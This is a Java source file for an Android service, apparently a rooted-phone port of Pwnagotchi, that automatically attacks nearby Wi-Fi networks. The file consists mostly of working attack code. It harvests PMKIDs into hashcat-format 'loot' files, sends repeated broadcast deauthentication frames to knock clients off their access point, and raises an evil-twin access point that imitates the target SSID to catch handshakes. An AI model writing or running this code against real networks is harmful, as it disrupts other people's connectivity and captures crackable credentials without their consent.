package com.pwnagotchi.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import java.io.*;
import java.util.*;

public class PwngService extends Service {

    private static final String CHANNEL_ID = "pwnagotchi_channel";
    private static final int NOTIFY_ID = 42;
    private static final String WPA_CTRL = "/data/vendor/wifi/wpa/sockets";
    private static final String IFACE = "wlan0";
    private static final int SCAN_INTERVAL = 15000;

    private PwngBrain brain;
    private Handler handler;
    private Set<String> knownPmkids = new HashSet<>();
    private String currentFace = "(◕‿‿◕)";
    private String currentStatus = "initializing brain...";
    private String currentPhase = "BOOT";
    private int apCount = 0, wpa2Count = 0;
    private int totalPmkids = 0, totalHandshakes = 0;
    private long sessionStart;
    private volatile boolean isRunning = false;
    private String lootDir, ourMac = "000000000000";

    // ─── Faces ──────────────────────────────────────────────
    private static final Map<String, String> FACES = new LinkedHashMap<>();
    static {
        FACES.put("AWAKE",  "(◕‿‿◕)"); FACES.put("BORED",  "(-__-)");
        FACES.put("HAPPY",  "(•‿‿•)"); FACES.put("EXCITED","(ᵔ◡◡ᵔ)");
        FACES.put("LONELY", "(ب__ب)"); FACES.put("SAD",    "(╥☁╥ )");
        FACES.put("COOL",   "(⌐■_■)"); FACES.put("SMART",  "(✜‿‿✜)");
        FACES.put("FRIEND", "(♥‿‿♥)"); FACES.put("INTENSE","(°▃▃°)");
        FACES.put("MOTIVATED","(☼‿‿☼)"); FACES.put("SLEEP","(⇀‿‿↼)");
        FACES.put("GRATEFUL","(^‿‿^)"); FACES.put("DEMOTIVATED","(≖__≖)");
        FACES.put("BROKEN","(☓‿‿☓)"); FACES.put("DEBUG","(#__#)");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sessionStart = System.currentTimeMillis();
        
        File extDir = getExternalFilesDir(null);
        lootDir = extDir != null ? new File(extDir, "handshakes").getAbsolutePath()
                                 : getFilesDir() + "/handshakes";
        new File(lootDir).mkdirs();
        
        String macRaw = execSu("ip link show wlan0 2>/dev/null | grep -oP 'link/ether \\K[0-9a-f:]+' | head -1");
        if (macRaw != null && macRaw.length() >= 17) ourMac = macRaw.replace(":", "").toUpperCase();
        
        brain = new PwngBrain();
        currentFace = "(◕‿‿◕)";
        currentStatus = "brain ready, scanning...";
        currentPhase = "OBSERVE";
        loadKnownPmkids();
        createNotificationChannel();
        
        // Immediate UI update
        updateNotification();
        
        handler = new Handler(Looper.getMainLooper());
        // Start background scan loop - isRunning must be true first!
        isRunning = true;
        new Thread(() -> {
            while (isRunning) {
                doScanCycle();
                sleep(SCAN_INTERVAL);
            }
        }, "PwngAI").start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            isRunning = false;
            stopForeground(true); stopSelf(); return START_NOT_STICKY;
        }
        startForeground(NOTIFY_ID, buildNotification());
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        // Emergency WiFi recovery
        execSu("cmd wifi stop-softap");
        execSu("cmd wifi set-wifi-enabled enabled");
        super.onDestroy();
    }

    // ─── AI Scan Loop ──────────────────────────────────────

    private void doScanCycle() {
        // Scan
        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " scan");
        sleep(3500);
        String results = execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " scan_results");
        
        List<String[]> scanData = new ArrayList<>();
        int apTot = 0, wpa2Tot = 0;
        for (String line : results.split("\n")) {
            if (line.startsWith("bssid") || line.trim().isEmpty()) continue;
            String[] p = line.split("\t");
            if (p.length < 5) continue;
            apTot++; if (p[3].contains("WPA")) wpa2Tot++;
            scanData.add(new String[]{p[0].trim(), p[4].trim(), p[1].trim(), p[2].trim(), p[3].trim()});
        }
        apCount = apTot; wpa2Count = wpa2Tot;

        PwngBrain.Decision d = brain.think(apTot, wpa2Tot, scanData);
        
        if (d.face != null) currentFace = d.face;
        if (d.status != null) currentStatus = d.status;
        currentPhase = brain.getPhaseName();
        totalPmkids = brain.getTotalPmkids();
        totalHandshakes = brain.getTotalHandshakes();

        boolean success = false;
        switch (d.action) {
            case "aggressive":  success = doAggressiveHunt(d.targetBssid, d.targetSsid); break;
            case "evil_twin":   success = doEvilTwin(d.targetBssid, d.targetSsid, d.targetFreq, false); break;
            case "deauth_twin": success = doEvilTwin(d.targetBssid, d.targetSsid, d.targetFreq, true); break;
        }
        
        brain.reportResult(d.action, success, d.targetBssid, success ? "ok" : "fail");
        updateNotification();
    }

    // ─── Actions ───────────────────────────────────────────

    private boolean doAggressiveHunt(String bssid, String ssid) {
        currentStatus = "☠ hunting " + ssid;
        updateNotification();
        
        String netId = execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " add_network").trim();
        if (netId.isEmpty() || netId.contains("FAIL")) return false;
        
        StringBuilder hx = new StringBuilder();
        try { for (byte b : ssid.getBytes("UTF-8")) hx.append(String.format("%02x", b&0xFF)); }
        catch (Exception e) { return false; }
        
        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " set_network " + netId + " ssid " + hx);
        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " set_network " + netId + " key_mgmt WPA-PSK");
        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " set_network " + netId +
            " psk 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f");
        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network " + netId);
        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " select_network " + netId);
        sleep(2500);
        
        String info = execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " bss " + bssid);
        List<String> pmkids = extractPmkids(info);
        
        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " remove_network " + netId);
        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
        
        boolean found = false;
        for (String pk : pmkids) {
            if (!knownPmkids.contains(pk)) {
                knownPmkids.add(pk); savePmkid(bssid, ssid, pk); found = true;
            }
        }
        return found;
    }

    private boolean doEvilTwin(String bssid, String ssid, int freq, boolean deauth) {
        try {
            if (deauth) {
                currentStatus = "👊 deauth " + ssid;
                updateNotification();
                for (int i = 0; i < 3; i++) {
                    execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid +
                           " ff:ff:ff:ff:ff:ff " + freq);
                    sleep(200);
                }
            }
            
            // Disable all saved networks so phone doesn't auto-reconnect to home WiFi
            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
                + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
                + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
            
            currentStatus = "🎭 Evil Twin: " + ssid;
            updateNotification();
            
            execSu("cmd wifi set-wifi-enabled disabled"); sleep(1000);
            execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345");
            sleep(2000);
            
            boolean caught = false;
            long start = System.currentTimeMillis();
            while (System.currentTimeMillis() - start < 15000) {
                String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
                if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
                    caught = true;
                    try {
                        FileWriter fw = new FileWriter(new File(lootDir, "evil_twin_handshakes.txt"), true);
                        fw.write("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new Date())
                            + "] " + ssid + " (" + bssid + ") HANDSHAKE\n");
                        fw.close();
                    } catch (Exception e) {}
                    break;
                }
                sleep(3000);
            }
            
            if (caught) { currentFace = FACES.get("FRIEND"); currentStatus = "🎭 CAUGHT: " + ssid; }
            else currentStatus = "🎭 no client for " + ssid;
            return caught;
            
        } finally {
            execSu("cmd wifi stop-softap");
            sleep(1000);
            execSu("cmd wifi set-wifi-enabled enabled");
            sleep(2000);
            // Re-enable all networks
            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
                + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
                + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network \\$nid 2>/dev/null; done");
            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
            updateNotification();
        }
    }

    // ─── PMKID ─────────────────────────────────────────────

    private List<String> extractPmkids(String output) {
        List<String> pmkids = new ArrayList<>();
        java.util.regex.Pattern p = java.util.regex.Pattern.compile("^(ie|beacon_ie)=([0-9a-fA-F]+)", java.util.regex.Pattern.MULTILINE);
        java.util.regex.Matcher m = p.matcher(output);
        while (m.find()) pmkids.addAll(parseRsnIe(m.group(2)));
        return new ArrayList<>(new LinkedHashSet<>(pmkids));
    }

    private List<String> parseRsnIe(String hex) {
        List<String> pmkids = new ArrayList<>();
        try {
            byte[] d = hexToBytes(hex); int i = 0;
            while (i < d.length - 2) {
                int tag = d[i]&0xFF, len = d[i+1]&0xFF; i += 2;
                if (i + len > d.length) break;
                if (tag == 0x30 && len >= 20) {
                    int pos = i + 6, end = i + len;
                    if (pos >= end) continue;
                    int pc = (d[pos]&0xFF) | ((d[pos+1]&0xFF)<<8); pos += 2+pc*4;
                    if (pos >= end) continue;
                    int ac = (d[pos]&0xFF) | ((d[pos+1]&0xFF)<<8); pos += 2+ac*4;
                    if (pos >= end) continue;
                    pos += 2; if (pos >= end) continue;
                    if (pos + 2 <= end) {
                        int pkc = (d[pos]&0xFF) | ((d[pos+1]&0xFF)<<8); pos += 2;
                        for (int p=0; p<pkc && pos+16<=end; p++) {
                            StringBuilder sb = new StringBuilder();
                            for (int x=0; x<16; x++) sb.append(String.format("%02x", d[pos+x]&0xFF));
                            pmkids.add(sb.toString()); pos += 16;
                        }
                    }
                }
                i += len;
            }
        } catch (Exception e) {}
        return pmkids;
    }

    private void savePmkid(String bssid, String ssid, String pmkid) {
        try {
            new File(lootDir).mkdirs();
            FileWriter fw = new FileWriter(new File(lootDir, "pmkid_hashes.22000"), true);
            fw.write("WPA*02*" + pmkid + "*" + bssid.replace(":","").toUpperCase()
                     + "*" + ourMac + "*" + ssid + "***\n");
            fw.close();
            FileWriter kw = new FileWriter(new File(lootDir, ".known_pmkids"), true);
            kw.write(pmkid + "\n"); kw.close();
        } catch (Exception e) {}
    }

    // ─── Helpers ───────────────────────────────────────────

    private byte[] hexToBytes(String h) {
        byte[] d = new byte[h.length()/2];
        for (int i=0; i<h.length(); i+=2)
            d[i/2] = (byte)((Character.digit(h.charAt(i),16)<<4) + Character.digit(h.charAt(i+1),16));
        return d;
    }

    private void loadKnownPmkids() {
        try {
            File f = new File(lootDir, ".known_pmkids");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f)); String l;
                while ((l = br.readLine()) != null) if (!l.trim().isEmpty()) knownPmkids.add(l.trim());
                br.close();
            }
        } catch (Exception e) {}
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Pwnagotchi", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("AI-driven WiFi security research");
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent pi = new Intent(this, MainActivity.class);
        PendingIntent p = PendingIntent.getActivity(this, 0, pi, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        Intent si = new Intent(this, PwngService.class); si.setAction("STOP");
        PendingIntent sp = PendingIntent.getService(this, 0, si, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Pwnagotchi " + currentFace)
            .setContentText("[" + currentPhase + "] " + currentStatus + " | APs:" + apCount)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true).setContentIntent(p)
            .addAction(android.R.drawable.ic_media_pause, "Stop", sp).build();
    }

    private void updateNotification() {
        getSystemService(NotificationManager.class).notify(NOTIFY_ID, buildNotification());
        Intent u = new Intent("com.pwnagotchi.app.STATS_UPDATE");
        u.setPackage(getPackageName());
        u.putExtra("face", currentFace); u.putExtra("status", currentStatus);
        u.putExtra("phase", currentPhase);
        u.putExtra("apCount", apCount); u.putExtra("wpa2Count", wpa2Count);
        u.putExtra("totalPmkids", totalPmkids); u.putExtra("totalHandshakes", totalHandshakes);
        u.putExtra("totalScans", brain != null ? brain.getTotalScans() : 0);
        u.putExtra("sessionStart", sessionStart);
        sendBroadcast(u);
    }

    private String execSu(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            StringBuilder sb = new StringBuilder(); String l;
            new Thread(() -> { try { Thread.sleep(10000); p.destroy(); } catch (Exception e) {} }).start();
            while ((l = br.readLine()) != null) sb.append(l).append("\n");
            while (er.readLine() != null) {}
            br.close(); er.close(); p.waitFor();
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
}
